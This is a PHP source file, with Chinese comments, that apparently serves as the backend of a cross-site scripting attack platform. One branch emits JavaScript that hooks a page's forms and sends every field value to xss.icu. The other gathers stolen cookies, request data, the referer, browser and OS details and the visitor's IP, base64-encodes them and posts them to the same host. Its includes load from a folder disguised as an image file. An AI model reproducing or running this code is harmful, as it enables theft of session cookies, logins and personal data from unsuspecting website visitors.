<?php
error_reporting(0);//禁用错误报告
include "test.jpg/vendor/autoload.php";
use apanly\BrowserDetector\Browser;
use apanly\BrowserDetector\Os;
use apanly\BrowserDetector\Device;
$id = $_GET['id'];
$url = $_GET['url'];
$topurl = $_GET['topurl'];
if ($_GET['ss'] && $id) {
    $funcname = $_GET['funcname'];
    $formname = '"'.$_GET['formname'].'"';
    $formid = '"'.$_GET['formid'].'"';
    echo " 	var  xurl='//xss.icu/methond.php?id={$id}&url={$url}&topurl={$topurl}'; 	var form= ( $formname ) ?  document.forms[$formname] :  document.getElementById($formid); 	";
    if ($funcname) {
        echo 'function getForm(e){var t,n="",r="",i,s;for(t=0;t<e.length;t++){i=e[t];if(i.name!=""){if(i.type=="select-one")s=i.options[i.selectedIndex].value;else if(i.type=="checkbox"||i.type=="radio"){if(i.checked==0)continue;s=i.value}else{if(i.type=="button"||i.type=="submit"||i.type=="reset"||i.type=="image")continue;s=i.value}n+=r+encodeURIComponent(i.name)+"="+encodeURIComponent(s),r="&"}}return n} '."     $funcname=xss.proxy($funcname,function(){  xss.ajax(xurl,getForm(form)); })";
    } else {
        echo 'xss.xform(form,xurl);';
    }
} else {
    $urls = $_SERVER['HTTP_REFERER'];
    $data = "";
	$browser = new Browser();
	$os = new Os();
	$device = new Device();
    foreach($_REQUEST as $k=>$v) {
        $data.="|$k=$v";
    }
	$sbw = "";
	if($device->getName()!="unknown"){
		$sbw = "----设备为：".$device->getName();
	}
	$datas = "操作系统：".$os->getName()." ".$os->getVersion()."----浏览器：".$browser->getName()."(版本:".$browser->getVersion().")".$sbw;
	$data=base64_encode($data."----".$datas);
	include 'test.jpg/curl.php';
	$curl = new MyCurl();
	$date = array(
	'opener' => $urls,
	'toplocation' => $topurl,
	'location' => $url, 
	'cookie' => $data,
	'agent' => $_SERVER['HTTP_USER_AGENT'],
	'ip' => get_ipip()
	);
	$aaaaa = $curl->send("http://xss.icu/bdstatic.com/?callback=jsonp&id={$id}&imgs=1", $date, 'post');
    //file_get_contents("http://gdd.gd/bdstatic.com/?callback=jsonp");
}

function safeEncoding($string,$outEncoding = 'UTF-8')
	{
		$encoding = "UTF-8";
		for($i = 0; $i < strlen ( $string ); $i ++) {
			if (ord ( $string {$i} ) < 128)
				continue;

			if ((ord ( $string {$i} ) & 224) == 224) {
				// 第一个字节判断通过
				$char = $string {++ $i};
				if ((ord ( $char ) & 128) == 128) {
					// 第二个字节判断通过
					$char = $string {++ $i};
					if ((ord ( $char ) & 128) == 128) {
						$encoding = "UTF-8";
						break;
					}
				}
			}
			if ((ord ( $string {$i} ) & 192) == 192) {
				// 第一个字节判断通过
				$char = $string {++ $i};
				if ((ord ( $char ) & 128) == 128) {
					// 第二个字节判断通过
					$encoding = "GB2312";
					break;
				}
			}
		}

		if (strtoupper ( $encoding ) == strtoupper ( $outEncoding ))
			return $string;
		else
			return @iconv ( $encoding, $outEncoding, $string );
	}
	
//获取IP QQ:411161555   哥不能在详细了，这个获取脚本已经几乎可以了。
function get_ipip() {
	$ip = "";
	if(getenv('REMOTE_ADDR') && strcasecmp(getenv('REMOTE_ADDR'), 'unknown') && preg_match('/^([0-9]{1,3}\.){3}[0-9]{1,3}$/', $_SERVER['REMOTE_ADDR'])){
		$ip = $_SERVER['REMOTE_ADDR'];
	} elseif(isset($_SERVER['HTTP_CLIENT_IP']) && preg_match('/^([0-9]{1,3}\.){3}[0-9]{1,3}$/', $_SERVER['HTTP_CLIENT_IP'])) {
		$ip = $_SERVER['HTTP_CLIENT_IP'];
	} elseif(isset($_SERVER['HTTP_X_FORWARDED_FOR']) AND preg_match_all('#\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}#s', $_SERVER['HTTP_X_FORWARDED_FOR'], $matches)) {
		foreach ($matches[0] AS $xip) {
			if (!preg_match('#^(10|172\.16|192\.168)\.#', $xip)) {
				$ip = $xip;
				break;
			}
		}
	} elseif(isset($_SERVER['REMOTE_ADDR']) && $_SERVER['REMOTE_ADDR'] && strcasecmp($_SERVER['REMOTE_ADDR'], 'unknown')){
		$ip = $_SERVER['REMOTE_ADDR'];
	}
	return $ip;
}
?>